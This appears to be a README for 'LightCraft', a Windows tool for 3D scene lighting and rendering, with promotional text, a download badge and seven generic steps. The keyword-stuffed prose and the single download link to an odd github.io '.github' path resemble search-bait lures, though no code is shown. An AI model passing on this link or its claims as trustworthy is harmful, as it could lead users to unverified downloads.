## About LightCraft

LightCraft is a focused 3D visualization tool for building realistic scenes, previewing lighting setups, and rendering with physically accurate materials. LightCraft 3D rendering keeps the process readable: choose a scene, adjust lights, review materials, and generate a clear preview without fighting complex node graphs or hidden settings.

LightCraft scene lighting is built around simple control. Instead of layering many disconnected panels, LightCraft lets you place a light, tune intensity and temperature, and see the result quickly. That matters for architectural visualization, where daylight studies and interior moods need fast comparison, and for product visualization, where reflections and surface response must stay believable.

The tool also fits everyday creative work. Designers use LightCraft for quick previews before a full render pass, students use it to learn how light interacts with surfaces, and small teams use it to review options together. LightCraft architectural visualization workflows benefit from steady previews, clear units, and a layout that keeps the scene, the lighting panel, and the render view in one place.

Because materials follow physically based rules, surfaces respond to light in a predictable way. Metal looks like metal, glass reads as glass, and matte finishes stay soft. Combined with simple lighting control, this makes LightCraft a practical choice for anyone who wants realistic results without a steep learning curve.

## Starting with LightCraft

[![GET LightCraft](https://img.shields.io/badge/GET%20%E2%80%94%20LightCraft-0078D6?style=for-the-badge&logoColor=white)](https://lightcraft-scene-lighting.github.io/.github/lightcraft-3d-rendering)

Prerequisites: A Windows PC, a scene or model to work with, and enough space to save previews and final renders.

1. **Prepare:** Close heavy apps and confirm your scene files are accessible before opening LightCraft.
2. **Configure:** Launch LightCraft, set render units and preview quality, then choose a working folder.
3. **Light:** Add lights, adjust intensity and temperature, and check the preview for the mood you want.
4. **Material:** Assign physically accurate materials and confirm that surfaces respond as expected.
5. **Preview:** Run a fast preview and compare lighting options before committing to a final pass.
6. **Render:** Increase quality and run the final render, then save the output on healthy storage.
7. **Repeat:** Revisit lighting or materials after review, and re-render to confirm the result.
